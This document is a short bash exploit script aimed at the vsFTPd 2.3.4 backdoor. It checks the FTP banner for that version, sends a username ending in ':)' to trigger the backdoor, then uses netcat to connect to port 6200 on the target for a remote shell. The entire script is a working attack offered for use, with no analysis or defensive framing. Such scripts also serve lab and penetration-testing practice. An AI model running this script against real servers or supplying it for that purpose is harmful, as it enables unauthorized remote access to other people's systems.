#!/bin/bash

if [[ $# -lt 1 || $# -gt 2 ]]; then
    echo "Usage: $0 IP [PORT]"
    exit 1
fi

IP=$1
PORT=${2:-21}

check_version() {
    echo "Checking Version..."
    RESPONSE=$(echo -e "QUIT" | nc -w 3 $IP $PORT)
    if [[ "$RESPONSE" == *"vsFTPd 2.3.4"* ]]; then
        echo "Version 2.3.4 Found"
    else
        echo "Version 2.3.4 Not Found!!!"
        exit 1
    fi
}

trigger_backdoor() {
    echo "Triggering Backdoor..."
    # We add a slight delay after sending each command to ensure the server has time to respond
    echo -e "USER hello:)\nPASS hello123\nQUIT" | nc -w 3 $IP $PORT
}

get_shell() {
    echo "Connecting To Backdoor..."
    sleep 1
    # We add a slight delay to give the backdoor time to open
    sleep 5
    nc $IP 6200
}

check_version
trigger_backdoor
get_shell
